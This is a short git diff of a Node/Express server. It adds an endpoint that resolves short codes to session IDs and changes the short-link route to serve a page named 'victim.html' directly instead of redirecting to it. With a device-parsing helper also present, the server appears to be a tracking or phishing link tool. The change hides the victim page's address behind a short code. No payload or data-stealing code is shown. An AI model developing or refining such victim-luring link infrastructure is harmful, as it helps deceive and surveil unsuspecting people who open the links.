@@ -79,6 +79,18 @@ function parseDevice(ua) {
 
 // --- МАРШРУТИ ---
 
+// API для получения session ID по короткому коду
+app.get('/api/resolve/:shortCode', (req, res) => {
+    const code = req.params.shortCode;
+    const sessionId = global.shortLinks[code];
+    
+    if (sessionId) {
+        res.json({ success: true, sessionId: sessionId });
+    } else {
+        res.json({ success: false, error: 'Session not found' });
+    }
+});
+
 // Головна сторінка -> victim.html
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'victim.html'));
@@ -95,7 +107,8 @@ app.get('/:shortCode', (req, res) => {
 
     const sessionId = global.shortLinks[code];
     if (sessionId) {
-        res.redirect(`/victim.html?id=${sessionId}`);
+        // Отправляем victim.html напрямую с коротким кодом вместо редиректа
+        res.sendFile(path.join(__dirname, 'public', 'victim.html'));
     } else {
         res.status(404).send(`
 <!DOCTYPE html>
